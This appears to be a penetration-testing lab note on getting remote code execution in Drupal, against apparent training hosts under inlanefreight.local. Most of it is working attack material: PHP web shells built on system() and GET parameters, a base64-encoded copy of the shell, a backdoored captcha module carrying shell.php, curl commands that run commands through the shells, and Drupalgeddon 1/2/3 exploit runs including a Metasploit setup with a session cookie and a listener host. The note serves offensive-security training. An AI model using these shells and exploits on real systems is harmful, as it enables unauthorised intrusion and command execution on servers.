## Leveraging the PHP Filter Module

1. Login as admin
2. Enable "PHP filter" module
3. Save configuration
4. Content -> Add content -> Basic page
```
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
5. Set Text format to PHP code

```
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

If Drupal is version 8 onward, then the PHP Filter module is not installed by default.

Check with client before adding the module.

**Download the most recent version of the module from the Drupal website
```
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- Once downloaded, go to Administration > Reports > Available updates
- May be under the "Extend" dropdown

1. Click on Browse
2. Select the file from the directory we downloaded it to
3. Click Install
4. Click on Content and create a new basic page
5. Redo the same steps as before


## Uploading a Backdoored Module

```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

```shell.php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

```.htaccess
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

```
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

1. Given admin access, click on Manage > Extend on sidebard
2. + Install new module
3. Browse to backdoored Captcha archive and click Install
```
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```


## Leveraging Known Vulnerabilities
- https://www.drupal.org/SA-CORE-2014-005 (Drupalgeddon)
- https://www.drupal.org/sa-core-2018-002 (Drupalgeddon2)
- https://cvedetails.com/cve/CVE-2018-7602/ (Drupalgeddon3)


## Drupalgeddon (add admin)
https://www.exploit-db.com/exploits/34992
https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/ (Metasploit)
```
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

## Drupalgeddon2
https://www.exploit-db.com/exploits/44448
```
python3 drupalgeddon2.py
http://drupal-dev.inlanefreight.local/
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```
```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```
```
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
```
python3 drupalgeddon2.py
http://drupal-dev.inlanefreight.local/
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

**Drupalgeddon3

1. Login and obtain session cookie with burp suite or inspect element
```
sudo msfconsole
use multi/http/drupal_drupageddon3
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
set DRUPAL_NODE 1
set LHOST 10.10.14.15
show options
exploit
```
